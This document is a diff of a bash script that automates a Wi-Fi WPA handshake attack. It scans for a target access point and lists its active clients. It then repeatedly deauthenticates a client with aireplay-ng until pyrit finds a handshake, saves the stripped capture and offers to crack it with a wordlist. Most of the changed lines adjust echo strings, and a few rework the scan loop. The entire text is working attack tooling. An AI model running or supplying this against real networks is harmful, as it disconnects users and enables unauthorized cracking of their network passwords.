@@ -18,38 +18,35 @@ fapscan()																#Determine AP BSSID and channel
 {
 	clear
 	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv&
-	$COLOR 2;echo "[*] Scanning for AP's with names like $PARTIALESSID [*]";$COLOR 9
+	$COLOR 2;echo " [*] Scanning for AP's with names like $PARTIALESSID [*] ";$COLOR 9
 	while [ $DONE -z ] 2> /dev/null
 		do
 			sleep 0.3
-			DONE=$(cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID) 
+			DONE=$(cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID)
+			ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -1)
+			if [ $ESSID -z ] 2> /dev/null
+				then
+					DONE=""
+			fi
 		done
 	sleep 0.5
 	killall airodump-ng
 	CHAN=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -1)
 	CHAN=$((CHAN + 1 - 1))
 	cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -1 > $HOME/tmp4.csv
-	ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -1)
 	BSSID=$(cat $HOME/tmp4.csv)
 	fclientscan
-	sleep $SLP
-	fapscan
 }
 
 fclientscan()															#Find active clients
 {
-	if [ ${BSSID:2:1} != ":" ] 2> /dev/null
-		then
-			rm -rf $HOME/tmp* 2> /dev/null
-			fapscan
-	fi
 	rm -rf $HOME/tmp* 2> /dev/null
 	CNT="0"
 	clear
 	ESSID=${ESSID:1}
-	$COLOR 2;echo " [*] $ESSID Found! BSSID:$BSSID CHANNEL:$CHAN [*]"
+	$COLOR 2;echo " [*] $ESSID Found! BSSID:$BSSID CHANNEL:$CHAN [*] "
 	echo
-	$COLOR 4;echo ' [*] Please wait while I find active clients.. [*]';$COLOR 9
+	$COLOR 4;echo ' [*] Please wait while I find active clients.. [*] ';$COLOR 9
 	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
 	DONE=""
 	while [ $DONE -z ] 2> /dev/null
@@ -79,28 +76,26 @@ fcap()																	#Deauth, capture and strip handshakes
 		then
 			CLIE=$(head -1 $HOME/tmp1)
 		else
-			$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
+			$COLOR 2;echo " [*] $CNT active clients found: ";$COLOR 9
 			cat $HOME/tmp1
 			echo
-			$COLOR 4;echo " [>] Please paste client MAC or Press Enter to use the first one:";$COLOR 9 
+			$COLOR 4;echo " [>] Please paste client MAC or Press Enter to use the first one: ";$COLOR 9 
 			read -p "  >" CLIE
 	fi
 	if [ $CLIE -z ] 2> /dev/null
 		then
 			CLIE=$(head -1 $HOME/tmp1)
 	fi
-	clear
-	echo
 	DONE=""
 	while [ $DONE -z ] 2> /dev/null
 		do
 			clear
-			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE";$COLOR 9;$COLOR2 9
+			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
 			echo
 			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
 			echo
 			sleep 3
-			$COLOR 4;echo " [*] Analyzing pcap for handshake [*]";$COLOR 9
+			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
 			sleep 2
 			DONE=$(pyrit -r $HOME/tmp1-01.cap analyze | grep good)
 			sleep 0.5
@@ -109,20 +104,20 @@ fcap()																	#Deauth, capture and strip handshakes
 	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
 	killall airodump-ng
 	clear
-	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*]";$COLOR 9
+	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
 	DATE=$( date +%Y_%m_%d_%H%M%S )
 	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
 	airmon-ng stop mon0
 	rm -rf $HOME/tmp*
 	clear
-	$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you";$COLOR 9
+	$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you ";$COLOR 9
 	echo
 	$COLOR 4;echo $DONE;$COLOR 9
 	echo
-	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap"";$COLOR 9
+	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
 	if [ $WORDLIST -z ] 2> /dev/null
 		then
-			$COLOR 4; echo " [>] Do you want to crack now? [Y/n]";$COLOR 9
+			$COLOR 4; echo " [>] Do you want to crack now? [Y/n] ";$COLOR 9
 			read -p "  >" DOCRK
 			case $DOCRK in
 				"")fcrack;;
@@ -142,7 +137,7 @@ fcrack()																#Crack handshakes
 	clear
 	if [ $WORDLIST -z ] 2> /dev/null
 		then
-			$COLOR 4;echo " [>] Please enter the full path of a wordlist to use";$COLOR 9
+			$COLOR 4;echo " [>] Please enter the full path of a wordlist to use ";$COLOR 9
 			read -e -p "  >" WORDLIST
 	fi
 	if [ ! -f $WORDLIST ] 2> /dev/null
@@ -200,7 +195,7 @@ fstart()																#Startup
 	if [ $MOND -z ] 2> /dev/null
 		then
 			clear
-			$COLOR 4;echo " [>] Which interface do you want to use?:";$COLOR 9
+			$COLOR 4;echo " [>] Which interface do you want to use?: ";$COLOR 9
 			echo
 			iwconfig | grep "wlan"
 			echo
